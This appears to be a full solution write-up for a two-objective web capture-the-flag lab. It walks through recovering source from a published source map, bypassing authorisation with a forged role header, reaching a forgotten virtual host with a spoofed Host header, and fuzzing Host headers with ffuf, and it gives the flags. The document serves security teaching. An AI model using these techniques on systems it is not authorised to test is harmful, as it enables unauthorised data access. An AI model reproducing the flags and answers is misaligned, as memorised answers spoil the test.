# Solution — Vega Freight

Full spoilers.

## Objective 1 — `HxBugLabs{s0urc3m4p_l34ks_th3_r34l_4p1}`

### Finding it

`GET /` serves a single script tag: `/assets/app.7c3f19.js`. Fetch the
bundle and read the last line:

```bash
curl -s http://localhost:8080/assets/app.7c3f19.js | tail -c 120
```

```
//# sourceMappingURL=app.7c3f19.js.map
```

The build shipped its source map to production. Pull it:

```bash
curl -s http://localhost:8080/assets/app.7c3f19.js.map | python3 -m json.tool | less
```

`sourcesContent` carries the original, unminified source of every module
that went into the bundle — including `src/api/client.js`, which the
public page imports one function from but which also contains the
dispatcher-console code:

```js
const DISPATCHER_HEADERS = {
  Accept: "application/json",
  "X-Vega-Role": "dispatcher",
};

export async function exportShipments() {
  const res = await fetch(`${API_BASE}/shipments/export`, {
    headers: DISPATCHER_HEADERS,
  });
  ...
}
```

Two things fall out: a route (`/api/v2/shipments/export`) and the header
that unlocks it.

### Exploiting it

Without the header the route is indistinguishable from a bad shipment
reference:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/api/v2/shipments/export
# 404
```

With it:

```bash
curl -s http://localhost:8080/api/v2/shipments/export -H 'X-Vega-Role: dispatcher'
```

```
ref,origin,dest,weight_kg,consignee,status
VG-88213,Rotterdam,Santos,18400,Halberd Metals,in-transit
...
# export-token,HxBugLabs{s0urc3m4p_l34ks_th3_r34l_4p1}
```

### Root cause

Two independent failures stacked:

1. **Source maps published to production.** The bundler was configured
   with `sourcemap: true` and the deploy copied `dist/` wholesale.
   `sourcesContent` embeds the full pre-minification source, so
   "minified" gives you no protection at all. In a real target this is
   how you get internal route names, feature flags, unreleased endpoints,
   and — often enough to always check — API keys.
2. **A static header as an authorization decision.** `X-Vega-Role:
   dispatcher` is a claim, not a credential. Anyone who knows the header
   name is a dispatcher. Answering `404` instead of `401` is security
   through obscurity, and the obscurity was in the bundle.

The `404` is worth dwelling on: it's a deliberate anti-scanner pattern
you will meet on real targets, and it means a wordlist-driven content
scan finds nothing here. The route was only ever findable by reading the
client.

## Objective 2 — `HxBugLabs{vh0st_fuzz1ng_f1nds_d34d_d3pl0ym3nts}`

### Finding it

Two artifacts name hosts you cannot resolve.

The recovered `src/api/client.js` has a CORS allow-list:

```js
export const ALLOWED_ORIGINS = [
  "https://vega-freight.local",
  "https://api.vega-freight.local",
  "https://legacy.vega-freight.local",
];
```

And `/.well-known/security.txt` explicitly excludes one host — which,
read as a hunter rather than as a lawyer, tells you the host exists:

```
# legacy.vega-freight.local is out of scope, it is being decommissioned.
```

DNS for `legacy.vega-freight.local` is gone. The *server* doesn't care —
virtual host routing keys off the `Host` header, not off DNS. If the old
site is still configured on the same process, sending the right `Host`
value to the same IP reaches it.

### Exploiting it

```bash
curl -s http://localhost:8080/ -H 'Host: legacy.vega-freight.local'
```

```html
<h1>Vega Dispatch</h1>
<p>Internal dispatcher console. Build 3.8.11 — deprecated, scheduled for
removal 2021-Q4.</p>
```

The old console links its own routes:

```bash
curl -s http://localhost:8080/dispatch/users.json -H 'Host: legacy.vega-freight.local'
```

```json
{
  "build": "3.8.11",
  "note": "flat-file auth, migrate before EOL",
  "users": [ { "username": "m.ferreira", "passwordHash": "$2a$10$5oV8...", "role": "dispatcher" }, ... ],
  "supportContact": "HxBugLabs{vh0st_fuzz1ng_f1nds_d34d_d3pl0ym3nts}"
}
```

On a real target you would find this by fuzzing the header rather than
by reading a comment:

```bash
ffuf -u http://TARGET/ -H 'Host: FUZZ.vega-freight.local' \
     -w subdomains.txt -fs <length-of-default-response>
```

The `-fs` filter is the whole technique: every unmatched Host falls
through to the default site and returns an identical response, so you
filter on that size and only the vhosts with their own configuration
survive.

### Root cause

A decommission that removed the DNS record and stopped there. The
application was never taken out of the server config, so it kept running
— with 2016-era flat-file auth, a user table served as JSON, and none of
the controls the replacement portal got.

This is one of the highest-yield recon findings in real bug bounty, and
it maps to two distinct classes triagers treat very differently:

- **Forgotten vhost still served** (this lab) — the app is alive on the
  same infrastructure and simply unreachable by name.
- **Subdomain takeover** — the DNS record was *kept* and points at a
  deprovisioned cloud resource you can claim.

Both start from "this name resolves to nothing useful"; only one of them
is fixed by deleting a DNS record.

## Notes for the report

If you were writing this up on a live program, objective 1 and objective 2
are two submissions, not one:

- *Source map disclosure leading to authentication bypass on an internal
  export endpoint* — the impact is the customer manifest (consignee
  names, weights, routes), not "source maps are exposed". Lead with the
  data.
- *Decommissioned dispatcher portal reachable via Host header, disclosing
  credential hashes* — and note that security.txt declares it out of
  scope. Real programs do this. Ask before testing it, and report the
  reachability itself even if you're told to stop.
